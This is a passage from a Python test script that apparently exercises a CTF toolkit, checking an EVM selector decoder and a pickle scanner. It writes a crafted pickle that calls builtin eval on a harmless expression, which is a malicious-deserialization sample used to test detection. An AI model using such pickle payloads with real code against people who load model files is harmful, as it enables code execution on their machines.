          and "0x" + "11" * 20 in r.stdout and "123456789" in r.stdout,
          r.stdout[-600:] + r.stderr)
    r = run("blockchain/evm_decode.py", "--sig", "transfer(address,uint256)")
    check("evm selector", "a9059cbb" in r.stdout, r.stdout[-300:] + r.stderr)

    # 130. pickle_scan: опасный GLOBAL и флаг
    pkl_path = os.path.join(tmp, "model.pkl")
    open(pkl_path, "wb").write(
        b"CTF{pickle_scan}\n" + b"c__builtin__\neval\n(S'1+1'\ntR.")
    r = run("ai/pickle_scan.py", pkl_path)
    check("ai/pickle_scan.py",
          "CTF{pickle_scan}" in r.stdout and "eval" in r.stdout,
          r.stdout[-600:] + r.stderr)

    checks_reverse(tmp)

    print(f"\n=== PASS: {passed}  FAIL: {failed} ===")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
